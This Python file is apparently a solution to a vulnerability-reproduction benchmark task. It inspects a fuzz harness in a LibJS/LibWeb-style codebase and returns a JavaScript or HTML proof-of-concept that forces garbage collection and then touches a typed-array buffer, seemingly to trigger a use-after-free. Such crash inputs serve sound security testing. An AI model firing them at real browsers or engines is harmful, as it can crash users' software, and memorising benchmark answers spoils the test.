import os
import tarfile
from typing import Iterable, Tuple, Optional


class Solution:
    def _iter_text_files_from_dir(self, root: str) -> Iterable[Tuple[str, bytes]]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx"}
        for base, _, files in os.walk(root):
            for fn in files:
                path = os.path.join(base, fn)
                _, ext = os.path.splitext(fn)
                if ext.lower() not in exts:
                    continue
                try:
                    st = os.stat(path)
                    if st.st_size <= 0 or st.st_size > 2_000_000:
                        continue
                    with open(path, "rb") as f:
                        yield path, f.read()
                except Exception:
                    continue

    def _iter_text_files_from_tar(self, tar_path: str) -> Iterable[Tuple[str, bytes]]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx"}
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                members = tf.getmembers()
                # Prefer likely harness locations first
                prioritized = []
                others = []
                for m in members:
                    if not m.isfile():
                        continue
                    name = m.name
                    _, ext = os.path.splitext(name)
                    if ext.lower() not in exts:
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    low = name.lower()
                    if "fuzz" in low or "fuzzer" in low or "ossfuzz" in low:
                        prioritized.append(m)
                    else:
                        others.append(m)
                for m in prioritized + others:
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        yield m.name, data
                    except Exception:
                        continue
        except Exception:
            return

    def _iter_text_files(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            yield from self._iter_text_files_from_dir(src_path)
        else:
            yield from self._iter_text_files_from_tar(src_path)

    def _detect_input_kind(self, src_path: str) -> str:
        # Heuristic: determine whether the fuzz harness consumes JS source directly or HTML.
        js_score = 0
        html_score = 0
        found_harness = False

        def bump_scores(content: bytes) -> None:
            nonlocal js_score, html_score, found_harness
            if b"LLVMFuzzerTestOneInput" in content or b"LLVMFuzzerInitialize" in content:
                found_harness = True
                js_score += 2
                html_score += 2
            if b"JS::" in content or b"LibJS" in content:
                js_score += 2
            if b"Interpreter" in content or b"VM" in content or b"Bytecode" in content:
                js_score += 1
            if b"parse_program" in content or b"Parser" in content and b"JS::" in content:
                js_score += 1

            if b"LibWeb" in content or b"Web::" in content:
                html_score += 2
            if b"HTML" in content and (b"Parser" in content or b"parse_html" in content or b"parse_html_document" in content):
                html_score += 2
            if b"Document" in content or b"BrowsingContext" in content or b"DOM" in content:
                html_score += 1
            if b"<script" in content or b"text/html" in content:
                html_score += 1

        # First pass: only likely harness files
        candidates: list[Tuple[str, bytes]] = []
        for path, data in self._iter_text_files(src_path):
            low = path.lower()
            if ("fuzz" in low or "fuzzer" in low or "ossfuzz" in low) and len(data) > 0:
                candidates.append((path, data))

        for _, data in candidates:
            bump_scores(data)

        # If no harness hints, do a limited broader scan
        if not found_harness:
            scanned = 0
            for _, data in self._iter_text_files(src_path):
                bump_scores(data)
                scanned += 1
                if scanned >= 250:
                    break

        return "html" if html_score > js_score else "js"

    def _poc_js(self) -> bytes:
        s = (
            "try{"
            "let v;"
            "try{v=new Uint8ClampedArray(0x10000);}catch(e){v=(new ImageData(256,256)).data;}"
            "function g(){"
            "if(typeof gc=='function')gc();"
            "else if(typeof __gc=='function')__gc();"
            "else{for(let k=0;k<64;k++){let a=[];for(let i=0;i<256;i++)a.push(new ArrayBuffer(0x4000));}}"
            "}"
            "g();g();"
            "v[0]=1;v[1]=2;v[0];"
            "}catch(e){}"
        )
        return s.encode("utf-8")

    def _poc_html(self) -> bytes:
        js = self._poc_js().decode("utf-8", "strict")
        html = "<!doctype html><meta charset=utf-8><script>" + js + "</script>"
        return html.encode("utf-8")

    def solve(self, src_path: str) -> bytes:
        kind = "js"
        try:
            kind = self._detect_input_kind(src_path)
        except Exception:
            kind = "js"
        if kind == "html":
            return self._poc_html()
        return self._poc_js()